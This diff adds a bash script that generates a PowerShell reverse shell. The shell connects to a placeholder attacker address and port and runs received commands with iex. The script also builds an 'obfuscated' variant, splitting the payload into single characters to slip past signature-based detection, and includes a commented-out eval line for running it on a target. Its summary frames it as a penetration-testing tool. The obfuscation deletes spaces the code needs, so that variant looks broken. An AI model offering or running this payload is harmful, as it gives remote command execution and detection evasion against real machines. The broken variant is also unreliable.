@@ -1,0 +1,45 @@
+```bash
+#!/bin/bash
+
+# 1. Raw Payload Code
+raw_payload='powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+
+# 2. Obfuscated Payload Code (Basic)
+obfuscated_payload=$(
+  echo "p o w e r s h e l l -c " | tr -d ' ' # Split chars and remove spaces
+  echo "\`\$c l i e n t = N e w - O b j e c t S y s t e m . N e t . S o c k e t s . T C P C l i e n t ( \`' A T T A C K E R _ I P\`' , A T T A C K E R _ P O R T ) ;" | tr -d ' ' # Split chars and remove spaces and escape chars to be split later
+  echo "\`\$s t r e a m = \$ c l i e n t . G e t S t r e a m ( ) ;" | tr -d ' '  # Split chars and remove spaces
+  echo "[b y t e [ ] ] \`\$b y t e s = 0 . . 6 5 5 3 5 | % { 0 } ;" | tr -d ' ' # Split chars and remove spaces
+  echo "w h i l e ( ( \`\$i = \$ s t r e a m . R e a d ( \$b y t e s , 0 , \$b y t e s . L e n g t h ) ) - n e 0 ) { " | tr -d ' ' # Split chars and remove spaces
+  echo "\`\$d a t a = ( N e w - O b j e c t - T y p e N a m e S y s t e m . T e x t . A S C I I E n c o d i n g ) . G e t S t r i n g ( \$b y t e s , 0 , \$i ) ;" | tr -d ' '  # Split chars and remove spaces
+  echo "\`\$s e n d b a c k = ( i e x \$ d a t a 2 > & 1 | O u t - S t r i n g ) ;" | tr -d ' '  # Split chars and remove spaces
+  echo "\`\$s e n d b a c k 2 = \$ s e n d b a c k + \`' P S \`' + ( p w d ) . P a t h + \`'> \`' ;" | tr -d ' '  # Split chars and remove spaces
+  echo "\`\$s e n d b y t e = ( [ t e x t . e n c o d i n g ] : : A S C I I ) . G e t B y t e s ( \$ s e n d b a c k 2 ) ;" | tr -d ' '  # Split chars and remove spaces
+  echo "\`\$s t r e a m . W r i t e ( \$s e n d b y t e , 0 , \$s e n d b y t e . L e n g t h ) ;" | tr -d ' ' # Split chars and remove spaces
+  echo "\`\$s t r e a m . F l u s h ( ) } ;" | tr -d ' '  # Split chars and remove spaces
+  echo "\`\$c l i e n t . C l o s e ( ) \`" | tr -d ' ' # Split chars and remove spaces
+)
+
+# 3. Example Usage (Replace with actual attacker IP and port)
+ATTACKER_IP="10.10.10.10"
+ATTACKER_PORT="4444"
+
+#Replace the IP and PORT in the Raw payload
+raw_payload_substituted=$(echo "$raw_payload" | sed "s/ATTACKER_IP/$ATTACKER_IP/g" | sed "s/ATTACKER_PORT/$ATTACKER_PORT/g")
+
+#Replace the IP and PORT in the Obfuscated payload
+obfuscated_payload_substituted=$(echo "$obfuscated_payload" | sed "s/ATTACKER_IP/$ATTACKER_IP/g" | sed "s/ATTACKER_PORT/$ATTACKER_PORT/g")
+
+echo "Raw Payload:"
+echo "$raw_payload_substituted"
+
+echo "\nObfuscated Payload:"
+echo "$obfuscated_payload_substituted"
+
+# Example execution (uncomment to execute on target. Be careful!)
+# eval "$obfuscated_payload_substituted"
+```
+
+**4. Summary:**
+
+This script generates a Windows reverse shell payload in PowerShell designed for penetration testing. The obfuscated version employs a basic technique: splitting strings into individual characters and removing spaces, which can bypass rudimentary signature-based detection mechanisms. This method aims to slightly obscure the payload's intent but is easily reversible.
